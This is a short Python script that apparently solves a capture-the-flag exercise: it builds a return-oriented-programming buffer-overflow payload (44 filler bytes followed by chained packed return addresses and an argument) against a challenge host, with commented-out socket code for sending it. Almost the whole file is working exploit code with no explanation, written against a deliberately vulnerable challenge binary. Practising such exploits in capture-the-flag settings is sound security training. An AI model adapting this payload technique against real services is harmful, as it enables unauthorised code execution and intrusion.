import struct
######################
#CANARY    : disabled
#FORTIFY   : disabled
#NX        : ENABLED  // ENABLED
#PIE       : disabled
#RELRO     : Partial  //Partial
#####################
#OFFSET = 44;
import socket
#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def p(x):
    return struct.pack("<L", x)


#s.connect(("ropi.vuln.icec.tf", 6500))
#print s.recv(1024)

payload = ""


payload += "A"*44
payload += p(0x080486ef)
payload += p(0x0804a020)
payload += p(0x08048569)
payload += p(0xbadbeef)
payload += p(0x080484cc)


payload += "BBBB"
print payload
#s.send(payload)
#print s.recv(1024)
